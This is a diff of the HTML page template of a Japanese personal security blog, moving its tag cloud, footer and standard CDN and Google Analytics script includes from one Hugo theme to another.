-        <ul class="pager blog-pager">
-          
-            <li class="previous">
-              <a href="https://www.shutingrz.com/post/ad_hack-ec_exploit/" data-toggle="tooltip" data-placement="top" title="ペネトレ検証-ECサイトに侵入">&larr; Previous Post</a>
-            </li>
-          
-          
-            <li class="next">
-              <a href="https://www.shutingrz.com/post/can-training-first/" data-toggle="tooltip" data-placement="top" title="シミュレーション環境でCAN通信を試す">Next Post &rarr;</a>
-            </li>
-          
-        </ul>
-      
-
-
-      
-
     </div>
-  </div>
+
+
+            </div>
+<div class="jumbotron fortags">
+	<div class="d-md-flex h-100">
+		<div class="col-md-4 transpdark align-self-center text-center h-100">
+			<div class="d-md-flex align-items-center justify-content-center h-100">
+				<h2 class="d-md-block d-none align-self-center py-1 font-weight-light">Explore <span class="d-none d-md-inline">→</span></h2>
+			</div>
+		</div>
+		<div class="col-md-8 p-5 align-self-center text-center">
+			
+			<a class="mt-1 mb-1" href="/tags/car-security">car-security</a>
+			
+			<a class="mt-1 mb-1" href="/tags/develop">develop</a>
+			
+			<a class="mt-1 mb-1" href="/tags/dns">dns</a>
+			
+			<a class="mt-1 mb-1" href="/tags/ethical_hacking">ethical_hacking</a>
+			
+			<a class="mt-1 mb-1" href="/tags/exploit">exploit</a>
+			
+			<a class="mt-1 mb-1" href="/tags/intelligence">intelligence</a>
+			
+			<a class="mt-1 mb-1" href="/tags/misc">misc</a>
+			
+			<a class="mt-1 mb-1" href="/tags/pentest">pentest</a>
+			
+			<a class="mt-1 mb-1" href="/tags/priv_escalation">priv_escalation</a>
+			
+			<a class="mt-1 mb-1" href="/tags/web">web</a>
+			
+			<a class="mt-1 mb-1" href="/tags/%E4%BB%AE%E6%83%B3%E9%80%9A%E8%B2%A8">仮想通貨</a>
+			
+			<a class="mt-1 mb-1" href="/tags/%E8%87%AA%E4%BD%9C%E4%BB%AE%E6%83%B3%E9%80%9A%E8%B2%A8%E5%85%A5%E9%96%80">自作仮想通貨入門</a>
+			
+		</div>
+	</div>
 </div>
 
-    <footer>
-  
-    
-      
-    
-      
-    
-      
-    
-  
-
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <ul class="list-inline text-center footer-links">
-          
-              <li>
-                <a href="https://github.com/shutingrz" title="GitHub">
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                  </span>
-                </a>
-              </li>
-              <li>
-                <a href="https://twitter.com/shutingrz" title="Twitter">
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
-                  </span>
-                </a>
-              </li>
-          
-          <li>
-            
-            <a href="https://www.shutingrz.com/index.xml" title="RSS">
-            
-              <span class="fa-stack fa-lg">
-                <i class="fas fa-circle fa-stack-2x"></i>
-                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
-              </span>
-            </a>
-          </li>
-          
-        </ul>
-        <p class="credits copyright text-muted">
-          
-            
-              <a href="www.shutingrz.com">しゅーと</a>
-            
-          
-
-          &nbsp;&bull;&nbsp;&copy;
-          
-            2020
-          
-
-          
-            &nbsp;&bull;&nbsp;
-            <a href="https://www.shutingrz.com/">Shooting!!!</a>
-          
-        </p>
-        
-        <p class="credits theme-by text-muted">
-          <a href="http://gohugo.io">Hugo v0.68.3</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
-          
-        </p>
-	<p class="credits theme-by text-muted">
-	  本サイトではアクセス解析に Google Analytics を利用しています
-	</p>
-      </div>
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-6 text-center text-lg-left">
+                &copy; Copyright shutingrz - All rights reserved / 本サイトではアクセス解析に Google Analytics を利用しています。
+            </div>
+            <div class="col-md-6 col-sm-6 text-center text-lg-right">    
+                <a target="_blank" rel="noopener" href="https://www.wowthemes.net">Mediumish Theme</a> by WowThemes.net
+            </div>
+        </div>
     </div>
-  </div>
-</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
-<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-
-<script src="https://www.shutingrz.com/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://www.shutingrz.com/js/load-photoswipe.js"></script>
+</footer>
 
 
+        </div>
 
 
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
 
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
 
+<script src="/js/mediumish.js"></script>
 
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-137567513-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
 
-
-  </body>
+    </body>
 </html>
-
